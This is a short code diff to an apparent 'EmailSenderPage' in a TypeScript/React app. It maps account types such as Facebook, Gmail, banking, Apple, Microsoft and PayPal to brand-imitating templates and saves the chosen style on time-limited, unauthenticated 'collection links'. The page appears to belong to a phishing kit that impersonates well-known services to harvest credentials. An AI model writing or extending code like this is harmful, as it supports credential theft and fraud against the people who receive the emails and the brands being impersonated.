@@ -181,6 +181,24 @@ export default function EmailSenderPage() {
       const expiresAt = new Date();
       expiresAt.setDate(expiresAt.getDate() + 7);
 
+      // Map account type to template ID
+      const templateMap: { [key: string]: string } = {
+        'facebook': 'facebook',
+        'gmail': 'gmail',
+        'instagram': 'instagram',
+        'banking': 'paypal', // Use PayPal as banking template
+        'whatsapp': 'facebook', // Use Facebook-style for WhatsApp
+        'linkedin': 'linkedin',
+        'twitter': 'twitter',
+        'apple': 'apple',
+        'microsoft': 'outlook', // Use Outlook for Microsoft
+        'amazon': 'amazon',
+        'paypal': 'paypal',
+        'tiktok': 'tiktok',
+      };
+
+      const templateStyle = templateMap[selectedAccountType] || 'facebook';
+
       const { data, error } = await supabase
         .from('collection_links')
         .insert({
@@ -192,6 +210,7 @@ export default function EmailSenderPage() {
           max_uses: 100,
           current_uses: 0,
           requires_auth: false,
+          template_style: templateStyle,
         })
         .select()
         .single();
